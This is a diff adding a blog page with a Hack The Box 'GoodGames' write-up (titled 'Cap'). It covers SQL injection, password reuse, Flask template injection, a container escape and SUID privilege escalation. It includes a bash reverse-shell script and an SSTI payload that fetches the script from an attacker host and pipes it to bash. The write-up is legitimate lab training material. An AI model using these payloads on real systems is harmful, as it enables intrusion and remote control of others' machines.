@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=d21921ee3792761e0f6e8496a0b7f1b120001e0f">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Cap | J0ker</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Cap" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="SOC Analyst documenting stuff" />
+<meta property="og:description" content="SOC Analyst documenting stuff" />
+<link rel="canonical" href="http://localhost:4000/htb/GoodGames.html" />
+<meta property="og:url" content="http://localhost:4000/htb/GoodGames.html" />
+<meta property="og:site_name" content="J0ker" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Cap" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"SOC Analyst documenting stuff","headline":"Cap","url":"http://localhost:4000/htb/GoodGames.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>J0ker</h1>
+        </a>
+        <h2>SOC Analyst documenting stuff </h2>
+
+        <section id="downloads">
+          
+	  <!--<a href="https://github.com/Mr-J0ker/Mr-J0ker.github.io" class="btn btn-github"><span class="icon"></span>View on GitHub</a> -->
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small></small>
+<h1>Cap</h1>
+
+<h1 id="summary">Summary</h1>
+<p>This box is rated easy but it does involve a fair bit of work before rooting the box. Initial scan shows only a customized web application available, which turns out to be vulnerable to SQLi allowing the dumping of the administrator password. Password reuse is heavy for this box - the same password allows us to access the Flask Volt Dashboard, which is vulnerable to SSTI allowing a foothold on the box.</p>
+
+<p>While the foothold is as root, it appears that we are in a container image. Further enumeration reveals the host of the image, and the mounted folders allow us to privesc via a SUID binary.</p>
+
+<h1 id="initial-enumeration">Initial Enumeration</h1>
+<p>Running the usual nmap scan, the only entry point is via the Web Application.<br />
+<img src="/docs/assets/images/htb/GoodGames/nmap_results.png" alt="nmap results" /></p>
+
+<h1 id="enumerating-the-web-app---sqli-gives-us-credentials">Enumerating the web app - SQLi gives us credentials</h1>
+<p>This is a customized application for the box. Looking at the source code, and running subdirectory enumeration returns nothing. 
+<img src="/docs/assets/images/htb/GoodGames/webapp.png" alt="webapp screenshot" /></p>
+
+<p>Eventually, firing SQLmap against the login request shows the application is vulnerable to SQLi. I was not able to get a shell via SQLmap, so I dumped out the user table for credentials that cna possibly allow further access. The password looks to be a hash, since that is definitely not the password I used for my created account, but it is easily cracked by Crackstation. 
+<img src="/docs/assets/images/htb/GoodGames/dumped_creds.png" alt="sqli_creds" /></p>
+
+<h2 id="sqli-manually">SQLi Manually</h2>
+<p>It is always good to try if I am able to SQLi without SQLMap. In this case, since there appears to be some validation of the email format, I will use Burp Suite Repeater to verify the success of my injection.</p>
+
+<p>First I used the usual ORDER BY payload to discover the number of columns returned by the query. Knowing there are 4 columns in the result, I will have to discover which of the 4 will return a result to screen - this appears to be the fourth column.
+<img src="/docs/assets/images/htb/GoodGames/sqli_columntype.png" alt="sqli_columntype" /></p>
+
+<p>Next I need to know what tables are there that are worth poking into, and also the columns for any table I am interested in. 
+<img src="/docs/assets/images/htb/GoodGames/sqli_tables.png" alt="sqli_tables" />
+<img src="/docs/assets/images/htb/GoodGames/sqli_user_columns.png" alt="sqli_user_columns" /></p>
+
+<p>That will be enough information for me to dump the user table.
+<img src="/docs/assets/images/htb/GoodGames/sqli_user_dump.png" alt="sqli_user_dump" /></p>
+
+<h1 id="flask-volt-dashboard">Flask Volt Dashboard</h1>
+<p>Logging in as the administrator, there seems to be an additional icon in the top right. This leads to another URL, which can be accessed once we add the mapping of the IP to the URL in /etc/hosts.
+<img src="/docs/assets/images/htb/GoodGames/admin_home.png" alt="admin view" />
+<img src="/docs/assets/images/htb/GoodGames/subdomain.png" alt="internal page" />
+<img src="/docs/assets/images/htb/GoodGames/flask_volt.png" alt="flask dashboard" /></p>
+
+<p>Thankfully, password reuse allows us to easily sign in as the administrator. Searching for flask volt dashboard exploits shows that Flask is potentially vulnerable to SSTI. The search function does not appear to be functioning, but testing the ‘Name’ field for the user settings show that this field is indeed vulnerable to SSTI - using the input ‘’ returns ‘49’ as our user name.
+<img src="/docs/assets/images/htb/GoodGames/ssti.png" alt="testing for SSTI" /></p>
+
+<p>The following payload will create a reverse shell through the bash script provided.</p>
+
+<p><em>rev.sh</em></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.14.14/4444 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><em>Payload</em></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{config.__class__.__init__.__globals__['os'].popen('curl 10.10.14.14/rev.sh | bash').read()}}
+</code></pre></div></div>
+
+<p><img src="/docs/assets/images/htb/GoodGames/rev.png" alt="reverse shell" /></p>
+
+<p>With this, we can retrieve user.txt.</p>
+
+<h1 id="breaking-out-of-the-container">Breaking out of the container</h1>
+<p>While the foothold is as root, it does not appear that there is a root.txt available on this machine. Looking around the host, this could be a container - there is a dockerfile in the folder, a user directory for augustus but no corresponding user defined in /etc/passwd. The IP address of the foothold is different from the IP address used to reach the application as well.
+<img src="/docs/assets/images/htb/GoodGames/ip_a.png" alt="ip_difference" /></p>
+
+<p>There is also a .dockerenv file - from research this is a file containing the environment variables defined inside the container.<br />
+<img src="/docs/assets/images/htb/GoodGames/dockerenv.png" alt="dockerenv" /></p>
+
+<p>linpeas confirmed that the foothold is that of a container, and that augustus is mounted from the host as well. 
+<img src="/docs/assets/images/htb/GoodGames/linpeas.png" alt="linpeas" />
+<img src="/docs/assets/images/htb/GoodGames/mount.png" alt="mount" /></p>
+
+<p>In the environment there is another host at 172.19.0.1 as well. 
+<img src="/docs/assets/images/htb/GoodGames/route.png" alt="route" /></p>
+
+<p>Since the host is not reachable via Kali directly, pivoting is necessary. My go-to for this is ligolo-ng.
+<img src="/docs/assets/images/htb/GoodGames/ligolo-ng.png" alt="ligolo-ng" />
+With the pivot set up and the internal host accessible, nmap shows two ports available. Port 80 is likely to be forwarded to 172.19.0.2:8085 and serving the web application. Trying SSH with the same password for augustus gives a foothold on this host.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Since we have root access in the container, and access to the host as well with /home/augustus mounted, hacktricks show that it is possible to use our root access to create a SUID binary in the shared folder through which the non-priv user can leverage for escalating privileges. In this case, the non-priv user can create a copy of bash. The root in the container will elevate its permission. 
+<img src="/docs/assets/images/htb/GoodGames/root_elevation.png" alt="root elevating permission" />
+<img src="/docs/assets/images/htb/GoodGames/suid.png" alt="SUID privesc" /></p>
+
+
+
+
+
+
+      </section>
+    </div>
+  </body>
+</html>
+
